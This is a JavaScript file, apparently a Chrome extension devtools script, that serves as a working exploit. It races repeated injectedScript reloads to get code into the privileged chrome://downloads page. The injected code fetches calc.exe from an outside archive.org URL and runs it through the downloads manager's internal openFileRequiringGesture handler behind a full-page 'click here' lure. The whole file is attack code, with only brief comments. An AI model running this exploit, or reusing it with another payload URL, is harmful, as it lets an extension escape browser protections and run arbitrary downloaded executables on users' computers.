//function which injects the content script into the inspected page
function inject_script() {
  chrome.devtools.inspectedWindow.reload({
    "injectedScript": `
    (async () => {
      //check the origin, this script won't do anything on a non chrome page
      console.log(origin);
      if (!origin.startsWith("chrome://")) return;
      
      let dl = await import("chrome://downloads/downloads.js");
      let url = "https://ia802803.us.archive.org/13/items/calc_exe_windows_xp/calc.exe";
      open(url);

      await new Promise((resolve) => {setTimeout(resolve, 1000)});
      let downloads_manager = document.getElementsByTagName("downloads-manager")[0];
      let first_item = downloads_manager.items_[0];

      let div = document.createElement("div");
      div.style.width = div.style.height = "100%";
      div.textContent = "click here";
      div.onclick = () => {
        downloads_manager.mojoHandler_.openFileRequiringGesture(first_item.id);
      }
      document.body.replaceWith(div);
    })()`
  });
} //interval to keep trying to inject the content script
//there's a tiny window of time in which the content script will be
//injected into a protected page, so this needs to run frequently


function start_interval() {
  setInterval(() => {
    for (let i = 0; i < 5; i++) {
      inject_script();
    }
  }, 0);
}

async function main() {
  //start the interval to inject the content script
  start_interval(); //navigate the inspected page to chrome://policy

  let tab = await chrome.tabs.get(chrome.devtools.inspectedWindow.tabId);
  await chrome.tabs.update(tab.id, {
    url: "chrome://downloads"
  }); //if this times out we need to retry or abort

  await new Promise(resolve => {
    setTimeout(resolve, 5000);
  });
  let new_tab = await chrome.tabs.get(tab.id); //we're still on the original page, so reload the extension frame to retry

  if (!new_tab.url.startsWith("chrome://downloads")) {
    location.reload();
  }
}

main();